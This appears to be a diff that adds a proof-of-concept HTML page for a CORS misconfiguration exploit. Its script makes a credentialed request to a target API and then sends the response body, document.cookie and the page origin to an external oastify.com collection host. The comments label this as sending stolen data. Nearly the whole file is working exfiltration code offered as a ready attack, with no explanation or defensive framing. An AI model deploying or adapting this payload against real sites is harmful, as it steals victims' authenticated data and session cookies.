@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+fetch('https://target.com/api/endpoint', {
+    method: 'GET',
+    credentials: 'include',  // Critical: sends cookies
+    mode: 'cors'
+})
+.then(r => r.text())
+.then(data => {
+    // Send stolen data + cookies to Collaborator
+    fetch('https://abc123.oastify.com/log', {
+        method: 'POST',
+        body: JSON.stringify({
+            response: data,
+            cookies: document.cookie,
+            origin: window.location.origin
+        })
+    });
+});
+</script>
+</body>
+</html>
